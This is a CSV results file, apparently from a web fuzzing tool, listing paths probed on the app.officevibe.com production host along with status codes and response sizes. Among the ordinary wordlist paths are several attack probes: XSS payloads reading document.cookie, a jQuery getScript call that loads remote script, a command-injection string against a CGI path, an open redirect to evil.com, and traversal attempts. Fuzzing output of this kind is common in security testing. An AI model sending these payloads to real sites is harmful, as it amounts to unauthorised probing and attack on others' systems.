FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
portal/update.php,https://app.officevibe.com/portal/update.php,,1191,200,2808,111,9,text/html,56.219972ms,
portal.css,https://app.officevibe.com/portal.css,,2372,200,2808,111,9,text/html,70.477778ms,
portal_member_check_call.jsp,https://app.officevibe.com/portal_member_check_call.jsp,,4184,200,2808,111,9,text/html,60.93127ms,
portal/employer/alternativeCareSelection.do,https://app.officevibe.com/portal/employer/alternativeCareSelection.do,,4508,200,2808,111,9,text/html,61.332008ms,
portalcreatesuccess.aspx,https://app.officevibe.com/portalcreatesuccess.aspx,,5204,200,2808,111,9,text/html,60.595396ms,
portal/app/mockapp/login.jsp?lrid=1,https://app.officevibe.com/portal/app/mockapp/login.jsp?lrid=1,,5767,200,2808,111,9,text/html,59.343286ms,
portal/assets/greece/map.htm,https://app.officevibe.com/portal/assets/greece/map.htm,,5819,200,2808,111,9,text/html,55.445606ms,
portal/broker/dentalselect.sdo,https://app.officevibe.com/portal/broker/dentalselect.sdo,,7246,200,2808,111,9,text/html,61.323678ms,
portal_id_login.jsp,https://app.officevibe.com/portal_id_login.jsp,,8331,200,2808,111,9,text/html,55.735592ms,
portal/shopping/dentalSelect.sdo,https://app.officevibe.com/portal/shopping/dentalSelect.sdo,,9804,200,2808,111,9,text/html,68.550114ms,
portal/member/alternativeCareSelection.do,https://app.officevibe.com/portal/member/alternativeCareSelection.do,,13642,200,2808,111,9,text/html,55.316565ms,
servlet/CookieExample?cookiename=<script>alert(document.cookie)(\,https://app.officevibe.com/servlet/CookieExample?cookiename=<script>alert(document.cookie)(\,,15840,500,75,12,1,text/html,76.562354ms,
portal/provider/search.ndo,https://app.officevibe.com/portal/provider/search.ndo,,16629,200,2808,111,9,text/html,72.961523ms,
portal.html,https://app.officevibe.com/portal.html,,16905,200,2808,111,9,text/html,76.993829ms,
portal/maintainers.txt,https://app.officevibe.com/portal/maintainers.txt,,17032,200,2808,111,9,text/html,56.605184ms,
hostapd_ssid=.*/hostapd_ssid=\\\,https://app.officevibe.com/hostapd_ssid=.*/hostapd_ssid=\\\,https://app.officevibe.com/hostapd_ssid=.*/hostapd_ssid=,18108,301,1403,270,21,text/html; charset=UTF-8,86.088083ms,
portal_index.jsp,https://app.officevibe.com/portal_index.jsp,,18711,200,2808,111,9,text/html,75.367407ms,
portal/admin/default.aspx,https://app.officevibe.com/portal/admin/default.aspx,,19018,200,2808,111,9,text/html,122.039179ms,
Portal.do,https://app.officevibe.com/Portal.do,,19300,200,2808,111,9,text/html,65.778301ms,
portal/member/dentalSelect.sdo,https://app.officevibe.com/portal/member/dentalSelect.sdo,,19455,200,2808,111,9,text/html,68.065803ms,
?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,https://app.officevibe.com/?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,,20499,200,4421,480,84,text/html; charset=utf-8,48.323925ms,
portal/xmlrpc.php,https://app.officevibe.com/portal/xmlrpc.php,,21026,200,2808,111,9,text/html,58.417828ms,
PortalSources/Portal.ini.php,https://app.officevibe.com/PortalSources/Portal.ini.php,,21525,200,2808,111,9,text/html,87.181107ms,
PortalCustomSearch.aspx,https://app.officevibe.com/PortalCustomSearch.aspx,,22082,200,2808,111,9,text/html,52.11287ms,
portal_ads.jsp,https://app.officevibe.com/portal_ads.jsp,,25017,200,2808,111,9,text/html,56.011442ms,
portal/employer/alternativeCareSelection.sdo,https://app.officevibe.com/portal/employer/alternativeCareSelection.sdo,,25485,200,2808,111,9,text/html,61.804515ms,
portal/install.php,https://app.officevibe.com/portal/install.php,,25949,200,2808,111,9,text/html,56.989279ms,
Portal/Portal.mwsl,https://app.officevibe.com/Portal/Portal.mwsl,,31435,200,2808,111,9,text/html,67.479443ms,
portal/client/eshop/selectCounty.action,https://app.officevibe.com/portal/client/eshop/selectCounty.action,,33070,200,2808,111,9,text/html,62.404065ms,
portal/member/dentalSelect.do,https://app.officevibe.com/portal/member/dentalSelect.do,,33277,200,2808,111,9,text/html,56.477704ms,
portalsearch.do,https://app.officevibe.com/portalsearch.do,,33828,200,2808,111,9,text/html,52.381294ms,
portal/member/alternativeCareSelection.sdo,https://app.officevibe.com/portal/member/alternativeCareSelection.sdo,,35157,200,2808,111,9,text/html,56.073673ms,
portalaccess.html,https://app.officevibe.com/portalaccess.html,,35262,200,2808,111,9,text/html,60.206685ms,
portal/yonetici/bloklar.asp,https://app.officevibe.com/portal/yonetici/bloklar.asp,,35886,200,2808,111,9,text/html,53.105022ms,
portal/member/disclaimer.do,https://app.officevibe.com/portal/member/disclaimer.do,,36839,200,2808,111,9,text/html,74.286436ms,
portal/content.sdo,https://app.officevibe.com/portal/content.sdo,,36897,200,2808,111,9,text/html,53.952916ms,
portal/yonetici/video.asp,https://app.officevibe.com/portal/yonetici/video.asp,,37104,200,2808,111,9,text/html,62.910633ms,
portalinfo.do,https://app.officevibe.com/portalinfo.do,,38026,200,2808,111,9,text/html,65.396852ms,
portalaktuell.de.html,https://app.officevibe.com/portalaktuell.de.html,,38371,200,2808,111,9,text/html,58.051411ms,
portal.footer.html,https://app.officevibe.com/portal.footer.html,,38981,200,2808,111,9,text/html,55.258072ms,
portal_feed_styled.php,https://app.officevibe.com/portal_feed_styled.php,,39070,200,2808,111,9,text/html,64.519632ms,
portals/0/dz4all.asp,https://app.officevibe.com/portals/0/dz4all.asp,,40494,200,2808,111,9,text/html,61.819418ms,
config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E,https://app.officevibe.com/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E,,42062,500,75,12,1,text/html,66.525395ms,
portal_top_en.html,https://app.officevibe.com/portal_top_en.html,,42600,200,2808,111,9,text/html,63.314509ms,
portal/player/PlayerGG.aspx,https://app.officevibe.com/portal/player/PlayerGG.aspx,,42999,200,2808,111,9,text/html,50.689562ms,
portal.sln,https://app.officevibe.com/portal.sln,,44341,200,2808,111,9,text/html,59.951744ms,
cgi-bin/post32.exe|dir%20c:\,https://app.officevibe.com/cgi-bin/post32.exe|dir%20c:\,https://app.officevibe.com/cgi-bin/post32.exe|dir c:,44391,301,1399,271,21,text/html; charset=UTF-8,60.480688ms,
portal/player/playergg.aspx,https://app.officevibe.com/portal/player/playergg.aspx,,45728,200,2808,111,9,text/html,53.245385ms,
portal/employer/dentalSelect.sdo,https://app.officevibe.com/portal/employer/dentalSelect.sdo,,45947,200,2808,111,9,text/html,60.325913ms,
portal/broker/disclaimer.do,https://app.officevibe.com/portal/broker/disclaimer.do,,46406,200,2808,111,9,text/html,53.729945ms,
PortalHome.do,https://app.officevibe.com/PortalHome.do,,46822,200,2808,111,9,text/html,51.019468ms,
portalproperties.aspx,https://app.officevibe.com/portalproperties.aspx,,47081,200,2808,111,9,text/html,50.738564ms,
portallogin.asp,https://app.officevibe.com/portallogin.asp,,47833,200,2808,111,9,text/html,50.661115ms,
portal/yonetici/oyun.asp,https://app.officevibe.com/portal/yonetici/oyun.asp,,48980,200,2808,111,9,text/html,61.79411ms,
portal/CHANGELOG.txt,https://app.officevibe.com/portal/CHANGELOG.txt,,49715,200,2808,111,9,text/html,61.974015ms,
portal/client/eshop/minibasketWaring.action,https://app.officevibe.com/portal/client/eshop/minibasketWaring.action,,50255,200,2808,111,9,text/html,61.382588ms,
portal/login.jsp,https://app.officevibe.com/portal/login.jsp,,51426,200,2808,111,9,text/html,53.673712ms,
portal/secureemail.do,https://app.officevibe.com/portal/secureemail.do,,53374,200,2808,111,9,text/html,58.16511ms,
portal/yonetici/haber.asp,https://app.officevibe.com/portal/yonetici/haber.asp,,53529,200,2808,111,9,text/html,52.66371ms,
portal.jsp,https://app.officevibe.com/portal.jsp,,53777,200,2808,111,9,text/html,51.462617ms,
portal/pdf/tos.pdf,https://app.officevibe.com/portal/pdf/tos.pdf,,54110,200,2808,111,9,text/html,53.512516ms,
portal/provider/disclaimer.do,https://app.officevibe.com/portal/provider/disclaimer.do,,55339,200,2808,111,9,text/html,51.925124ms,
portal/provider/custom/content.do,https://app.officevibe.com/portal/provider/custom/content.do,,55828,200,2808,111,9,text/html,54.5701ms,
portal/provider/viewcontactusform.sdo,https://app.officevibe.com/portal/provider/viewcontactusform.sdo,,56106,200,2808,111,9,text/html,50.928539ms,
portallist.aspx,https://app.officevibe.com/portallist.aspx,,56972,200,2808,111,9,text/html,58.016318ms,
Portal/Picture/ShowObjectPicture.aspx,https://app.officevibe.com/Portal/Picture/ShowObjectPicture.aspx,,57123,200,2808,111,9,text/html,57.081059ms,
portal/broker/alternativecareselection.do,https://app.officevibe.com/portal/broker/alternativecareselection.do,,58888,200,2808,111,9,text/html,51.476594ms,
.,https://app.officevibe.com/.,,59964,200,4421,480,84,text/html; charset=utf-8,43.528752ms,
learning-catalytics.html,https://app.officevibe.com/learning-catalytics.html,https://ov-prod-ln-api-74jxbc6tdm5oc.azurewebsites.net:443/Account/AccessDenied?returnUrl=%2Flearning-catalytics.html,60299,302,0,1,1,,44.020702ms,
portal/broker/alternativeCareSelection.do,https://app.officevibe.com/portal/broker/alternativeCareSelection.do,,60773,200,2808,111,9,text/html,80.841459ms,
portal/broker/dentalselect.do,https://app.officevibe.com/portal/broker/dentalselect.do,,60940,200,2808,111,9,text/html,109.235222ms,
portal.cgi,https://app.officevibe.com/portal.cgi,,64536,200,2808,111,9,text/html,58.940015ms,
portal_photostory.php,https://app.officevibe.com/portal_photostory.php,,64735,200,2808,111,9,text/html,63.091016ms,
portalheader.aspx,https://app.officevibe.com/portalheader.aspx,,64750,200,2808,111,9,text/html,116.764652ms,
portal/blog/index.php,https://app.officevibe.com/portal/blog/index.php,,65106,200,2808,111,9,text/html,68.753882ms,
portal/classifieds.asp,https://app.officevibe.com/portal/classifieds.asp,,68680,200,2808,111,9,text/html,56.439617ms,
portal/employer/disclaimer.sdo,https://app.officevibe.com/portal/employer/disclaimer.sdo,,69184,200,2808,111,9,text/html,70.634407ms,
portalWarning.jsp,https://app.officevibe.com/portalWarning.jsp,,69206,200,2808,111,9,text/html,87.390782ms,
Portal/Picture/ShowObjectPicture.aspx?Width=%27910000&Height=1099000-=&ObjectType=News&ObjectID=,https://app.officevibe.com/Portal/Picture/ShowObjectPicture.aspx?Width=%27910000&Height=1099000-=&ObjectType=News&ObjectID=,,69417,200,2808,111,9,text/html,72.307674ms,
portal_intro.asp,https://app.officevibe.com/portal_intro.asp,,70437,200,2808,111,9,text/html,88.187209ms,
portal/swdepot/displayProductInfo.do,https://app.officevibe.com/portal/swdepot/displayProductInfo.do,,71471,200,2808,111,9,text/html,71.873722ms,
portal.cfm,https://app.officevibe.com/portal.cfm,,73935,200,2808,111,9,text/html,60.658232ms,
portal/secureEmail.sdo,https://app.officevibe.com/portal/secureEmail.sdo,,74102,200,2808,111,9,text/html,63.116686ms,
Portal/Research/ResearchPlan/UserStart.aspx,https://app.officevibe.com/Portal/Research/ResearchPlan/UserStart.aspx,,74563,200,2808,111,9,text/html,85.263993ms,
portallogin.do,https://app.officevibe.com/portallogin.do,,75685,200,2808,111,9,text/html,52.411899ms,
portal_cert_login.jsp,https://app.officevibe.com/portal_cert_login.jsp,,75753,200,2808,111,9,text/html,61.626841ms,
portal/yonetici/ilan.asp,https://app.officevibe.com/portal/yonetici/ilan.asp,,76454,200,2808,111,9,text/html,49.52456ms,
portal/shopping/dentalselect.do,https://app.officevibe.com/portal/shopping/dentalselect.do,,77415,200,2808,111,9,text/html,53.438863ms,
portal/license.txt,https://app.officevibe.com/portal/license.txt,,79299,200,2808,111,9,text/html,51.020062ms,
portal/employer/dentalSelect.do,https://app.officevibe.com/portal/employer/dentalSelect.do,,80659,200,2808,111,9,text/html,52.413343ms,
portalmain.do,https://app.officevibe.com/portalmain.do,,83714,200,2808,111,9,text/html,53.290383ms,
portal/site/businessexpress/template.PAGE,https://app.officevibe.com/portal/site/businessexpress/template.PAGE,,83790,200,2808,111,9,text/html,114.386143ms,
portal/broker/dentalplans.do,https://app.officevibe.com/portal/broker/dentalplans.do,,83945,200,2808,111,9,text/html,63.478464ms,
portalisneedverificationcode.do,https://app.officevibe.com/portalisneedverificationcode.do,,84222,200,2808,111,9,text/html,59.802331ms,
portal.component.html,https://app.officevibe.com/portal.component.html,,84277,200,2808,111,9,text/html,56.034121ms,
portal_bg_new.aspx,https://app.officevibe.com/portal_bg_new.aspx,,85182,200,2808,111,9,text/html,64.721781ms,
portale.asp,https://app.officevibe.com/portale.asp,,85505,200,2808,111,9,text/html,56.430184ms,
?mod=<script>alert(document.cookie)</script>&op=browse,https://app.officevibe.com/?mod=<script>alert(document.cookie)</script>&op=browse,,87084,500,75,12,1,text/html,67.869422ms,
portal/provider/search.sdo,https://app.officevibe.com/portal/provider/search.sdo,,87423,200,2808,111,9,text/html,54.486888ms,
portal/broker/disclaimer.sdo,https://app.officevibe.com/portal/broker/disclaimer.sdo,,87588,200,2808,111,9,text/html,59.398285ms,
portal/yonetici/yazi.asp,https://app.officevibe.com/portal/yonetici/yazi.asp,,88753,200,2808,111,9,text/html,62.484273ms,
portal/provider/content.sdo,https://app.officevibe.com/portal/provider/content.sdo,,90518,200,2808,111,9,text/html,64.165339ms,
PortalLogin.aspx,https://app.officevibe.com/PortalLogin.aspx,,90899,200,2808,111,9,text/html,68.343572ms,
portalhome.asp,https://app.officevibe.com/portalhome.asp,,91078,200,2808,111,9,text/html,63.252555ms,
portal.login.html,https://app.officevibe.com/portal.login.html,,91395,200,2808,111,9,text/html,59.493617ms,
portal/upgrade.txt,https://app.officevibe.com/portal/upgrade.txt,,91519,200,2808,111,9,text/html,103.229647ms,
portal6_entrevista_260.php,https://app.officevibe.com/portal6_entrevista_260.php,,91669,200,2808,111,9,text/html,68.328463ms,
portal/yonetici/chat.asp,https://app.officevibe.com/portal/yonetici/chat.asp,,92543,200,2808,111,9,text/html,75.819ms,
portal/provider/alternativecareselection.do,https://app.officevibe.com/portal/provider/alternativecareselection.do,,93931,200,2808,111,9,text/html,50.164561ms,
portal.xml,https://app.officevibe.com/portal.xml,,96291,200,2808,111,9,text/html,53.570244ms,
portal.view.html,https://app.officevibe.com/portal.view.html,,96976,200,2808,111,9,text/html,61.735654ms,
portal/apis/aggrecate_js.cgi,https://app.officevibe.com/portal/apis/aggrecate_js.cgi,,97561,200,2808,111,9,text/html,56.313771ms,
portalsettings.aspx,https://app.officevibe.com/portalsettings.aspx,,98916,200,2808,111,9,text/html,59.253325ms,
portal/employer/search.ndo,https://app.officevibe.com/portal/employer/search.ndo,,99116,200,2808,111,9,text/html,62.447976ms,
portal_favorites.xml,https://app.officevibe.com/portal_favorites.xml,,99518,200,2808,111,9,text/html,56.48514ms,
portal/broker/alternativeCareSelection.sdo,https://app.officevibe.com/portal/broker/alternativeCareSelection.sdo,,101724,200,2808,111,9,text/html,61.148098ms,
portal/member/dentalselect.do,https://app.officevibe.com/portal/member/dentalselect.do,,102613,200,2808,111,9,text/html,61.941246ms,
portal/yonetici/dostsiteler.asp,https://app.officevibe.com/portal/yonetici/dostsiteler.asp,,103483,200,2808,111,9,text/html,56.289671ms,
portal/INSTALL.pgsql.txt,https://app.officevibe.com/portal/INSTALL.pgsql.txt,,104411,200,2808,111,9,text/html,63.216739ms,
portal/client/cms/viewsitemap.action,https://app.officevibe.com/portal/client/cms/viewsitemap.action,,105047,200,2808,111,9,text/html,57.747286ms,
portalwebuser.do,https://app.officevibe.com/portalwebuser.do,,106587,200,2808,111,9,text/html,52.495491ms,
//evil.com/%2F..,https://app.officevibe.com///evil.com/%2F..,,106852,200,4421,480,84,text/html; charset=utf-8,61.145421ms,
portal/includes/portal_block.php,https://app.officevibe.com/portal/includes/portal_block.php,,108121,200,2808,111,9,text/html,51.459201ms,
portalprocess.jsp,https://app.officevibe.com/portalprocess.jsp,,108844,200,2808,111,9,text/html,55.738495ms,
Robots.txt,https://app.officevibe.com/Robots.txt,,110053,200,104,7,7,text/plain,65.921835ms,
portale/index2.html,https://app.officevibe.com/portale/index2.html,,110787,200,2808,111,9,text/html,63.961502ms,
portal_ranking.php,https://app.officevibe.com/portal_ranking.php,,111065,200,2808,111,9,text/html,49.846588ms,
portal/shopping/search.ndo,https://app.officevibe.com/portal/shopping/search.ndo,,111155,200,2808,111,9,text/html,57.193896ms,
Portal.po,https://app.officevibe.com/Portal.po,,112827,200,2808,111,9,text/html,63.340268ms,
#/../admin,https://app.officevibe.com/#/../admin,,113455,200,4421,480,84,text/html; charset=utf-8,104.839136ms,
portal/disclaimer.do,https://app.officevibe.com/portal/disclaimer.do,,113638,200,2808,111,9,text/html,69.472534ms,
portal/LICENSE.txt,https://app.officevibe.com/portal/LICENSE.txt,,114243,200,2808,111,9,text/html,74.609876ms,
portal/employer/search.sdo,https://app.officevibe.com/portal/employer/search.sdo,,114556,200,2808,111,9,text/html,55.718103ms,
portal/broker/search.do,https://app.officevibe.com/portal/broker/search.do,,115419,200,2808,111,9,text/html,69.507797ms,
portalresults.mspx,https://app.officevibe.com/portalresults.mspx,,115588,200,2808,111,9,text/html,67.641122ms,
portal/broker/custom/content.sdo,https://app.officevibe.com/portal/broker/custom/content.sdo,,116980,200,2808,111,9,text/html,52.619293ms,
portaltop.do,https://app.officevibe.com/portaltop.do,,119871,200,2808,111,9,text/html,98.055967ms,
portal/client/etopup/displayTerms.action,https://app.officevibe.com/portal/client/etopup/displayTerms.action,,119913,200,2808,111,9,text/html,69.676869ms,
portal.php$,https://app.officevibe.com/portal.php$,,120333,200,2808,111,9,text/html,59.225846ms,
portal_top.html ,https://app.officevibe.com/portal_top.html ,,120569,200,2808,111,9,text/html,52.621264ms,
Portal.aspx,https://app.officevibe.com/Portal.aspx,,121079,200,2808,111,9,text/html,98.399388ms,
portal/install.mysql.txt,https://app.officevibe.com/portal/install.mysql.txt,,121211,200,2808,111,9,text/html,81.608242ms,
portal/member/disclaimer.sdo,https://app.officevibe.com/portal/member/disclaimer.sdo,,121547,200,2808,111,9,text/html,52.696415ms,
